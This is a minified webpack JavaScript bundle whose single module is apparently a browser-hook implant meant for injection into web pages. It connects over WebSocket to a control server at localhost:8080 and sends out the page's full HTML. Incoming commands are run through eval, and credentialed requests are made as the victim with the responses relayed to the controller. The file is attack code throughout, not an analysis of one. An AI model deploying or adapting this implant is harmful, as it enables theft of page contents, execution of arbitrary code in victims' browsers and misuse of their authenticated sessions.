!function(e){var t={};function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{}};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}n.m=e,n.c=t,n.d=function(e,t,o){n.o(e,t)||Object.defineProperty(e,t,{configurable:!1,enumerable:!0,get:o})},n.r=function(e){Object.defineProperty(e,"__esModule",{value:!0})},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(module,exports){var ws=new WebSocket("wss://localhost:8080");ws.onopen=function(e){console.log("[*] opened");var t={data:document.getElementsByTagName("html")[0].innerHTML,cmd:"show",password:"lxraa"};ws.send(JSON.stringify(t)),ws.send(JSON.stringify({data:"",cmd:"auto",password:"lxraa"}))},ws.onmessage=function(e){bk.handler(e.data),console.log("[*] recv"+e.data)},ws.onclose=function(e){console.log("[*] closed")};var bk=bk||{};function list2Uint8Array(e){for(var t=e.length,n=new Uint8Array(t),o=0;o<t;o++)n[o]=255&e[o];return n}bk.config={headers_list:["content-type","accept","accept-language","content-language","last-event-id"]},bk.cmd_object=bk.cmd_object?bk.cmd_object:{},bk.register=function(e,t,n){return"string"==typeof e&&"function"==typeof t&&((void 0==n||"string"==typeof n)&&(this.cmd_object[e]={},this.cmd_object[e].func=t,this.cmd_object[e].help=n,!0))}.bind(bk),bk.checkCmd=function(e){return void 0!=this.cmd_object[e]}.bind(bk),bk.handler=function(e){try{var t=JSON.parse(e)}catch(e){console.log("[*] Deserialize failed")}if(void 0==t.cmd||!this.checkCmd(t.cmd))return!1;this.cmd_object[t.cmd](t.data)}.bind(bk),bk.cmd_object.run=function(data){eval(data)}.bind(bk.cmd_object),bk.cmd_object.request=function(e){var t="";e.body&&"Buffer"==e.body.type&&(t=list2Uint8Array(e.body.data));var n=new XMLHttpRequest;n.open(e.method,e.url),n.withCredentials=!0,e.headers&&Object.keys(e.headers).forEach(function(t){for(var o=0;o<bk.config.headers_list.length;o++)if(t.toLowerCase()==bk.config.headers_list[o])try{n.setRequestHeader(t,e.headers[t])}catch(e){console.log(e)}}),n.onreadystatechange=function(){if(4==n.readyState){var e={cmd:"proxy",data:{responseText:n.responseText,status:n.status},password:"lxraa"};ws.send(JSON.stringify(e))}},console.log(n),n.send(t)}.bind(bk.cmd_object)}]);